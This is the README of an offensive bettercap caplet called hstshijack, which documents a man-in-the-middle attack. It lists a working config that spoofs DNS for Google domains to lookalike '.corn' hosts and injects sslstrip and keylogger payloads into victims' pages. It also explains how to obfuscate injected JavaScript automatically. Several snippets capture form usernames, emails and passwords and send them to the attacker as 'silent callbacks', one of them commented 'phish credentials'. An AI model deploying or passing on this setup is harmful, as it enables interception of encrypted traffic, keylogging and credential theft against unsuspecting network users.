<p align="center">
  <img width="420px" src="https://raw.githubusercontent.com/buffermet/cdn/master/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

### Caplet

```sh
# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack

# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
# variables get precendence over those assigned to the 'hstshijack.ignore' variable.
set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
set hstshijack.ssl.check       true
#set hstshijack.blockscripts    example.com,*.example.com
set hstshijack.obfuscate       true
set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
#set hstshijack.ignore          *

set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
http.proxy on

set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
set dns.spoof.all      true
dns.spoof on
```

### Core payload

This module injects files with a JavaScript payload (<a href="./payloads/hijack.js">**hijack.js**</a>). This payload acts as a callback for bettercap, and takes care of hostname spoofing in the injected context (and document).

### Scalable domain indexing (SSL log)

If a host responds with an HTTPS redirect, bettercap will save this host in a list, and keep a log of (alphanumerically) ordered index ranges of the domains in this list, allowing it to scale by reducing a considerable amount of overhead for the proxy module.

Bettercap will try to spoof SSL connections between the client and said hosts, and will also send a HEAD request to each host that was discovered in an injected document, which we retrieve via callbacks from the hstshijack.js payload.

By default, this caplet will remap the index ranges of all domains that were found in the file that you assigned to the `hstshijack.ssl.domains` variable on launch (to ensure that it is still in the right format). You can skip this by setting the `hstshijack.ssl.check` variable value to `false`.

Hostnames that you target with the `hstshijack.targets` variable are automatically logged and indexed.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every targeted hostname you must specify a replacement hostname, like this:

```sh
set hstshijack.targets       google.com, *.google.com
set hstshijack.replacements  google.corn,*.google.corn
```

You can try to make them as unnoticeable as you can, but your options are limited here in terms of evading HSTS.

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript from hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### Custom payloads

You can also inject your own scripts into files from your specified hosts by assigning them to the `hstshijack.payloads` variable.

Custom payloads are assembled at launch, and wrapped inside a function which is defined as a property of the current JavaScript context (globalThis). This is done to ensure that your payload is only executed once on every document, even if injected multiple times. Individual payloads are not failsafe, so you must set your conditions/try and catch blocks yourself.

Example:

```sh
set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
```

You should always inject the hstshijack.js and sslstrip.js payloads when spoofing hostnames.

### Obfuscation

You can write custom payloads that are automatically obfuscated by the module.

Basically, every word that was found beginning with `obf_` will be obfuscated.

Example: 

```js
function obf_function() {
  alert("Random variable: obf_whatever_follows")
}

obf_function()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJWklwMNqshCaloE")
}

jfIleNwmKoa()
```

### Silent callbacks

You can have your payloads send callbacks to your machine that bettercap will print, but not proxy.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
  req.send()
}
```

The following POST request will be sniffed by bettercap, but not proxied (the request will be dropped). 

Any instance of `obf_path_callback` will be replaced with the callback path that bettercap listens for (this can save time when writing JavaScript payloads).

### Whitelisting callbacks

You can automatically terminate an attack between specific clients and hosts by making the client's machine initiate a whitelisting callback.

Example of multiple whitelisting callbacks:

```js
// Whitelist multiple hosts to ensure the intended resources will load.

form.onsubmit = function() {
  // Whitelist current hostname and phish credentials
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?email=" + email + "&password=" + password)
  req.send()

  // Whitelist facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://facedook.com/obf_path_whitelist")
  req.send()

  // Whitelist facebook CDN
  req = new XMLHttpRequest()
  req.open("POST", "http://static.xx.fdcdn.net/obf_path_whitelist")
  req.send()

  // Whitelist redirect to facebook
  req = new XMLHttpRequest()
  req.open("POST", "http://fd.com/obf_path_whitelist")
  req.send()
}
```

When a request is sent as above, bettercap will stop spoofing connections between the sender and the requested host.

If any resource from a spoofed host is requested that was previously whitelisted for that client, then that client will be redirected to the intended (unspoofed) host.

